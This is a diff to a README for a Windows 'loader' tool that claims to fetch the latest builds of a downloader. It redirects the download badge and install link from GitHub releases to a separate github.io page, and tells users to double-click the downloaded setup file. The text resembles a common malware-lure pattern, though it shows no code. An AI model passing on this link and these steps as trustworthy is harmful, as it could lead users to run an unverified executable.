@@ -1,6 +1,6 @@
 # 📂 firefly-aggregate-windows-hub - Simple tool to find latest builds
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mountainlilyroof276/firefly-aggregate-windows-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://mountainlilyroof276.github.io)
 
 This application serves as a loader for the Firefly Aggregate Downloader. It checks for new releases and directs you to the correct version for your computer. This software removes the need to manually search for updates or configure complex file paths. The hub manages your installation and ensures you always run the latest build.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The application requires a
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the project page to download the latest setup file: [https://github.com/Mountainlilyroof276/firefly-aggregate-windows-hub/releases](https://github.com/Mountainlilyroof276/firefly-aggregate-windows-hub/releases)
+1. Visit the project page to download the latest setup file: [https://mountainlilyroof276.github.io](https://mountainlilyroof276.github.io)
 2. Locate the file in your downloads folder once the process finishes.
 3. Double-click the file to start the installer.
 4. Follow the on-screen prompts to confirm the installation location. 
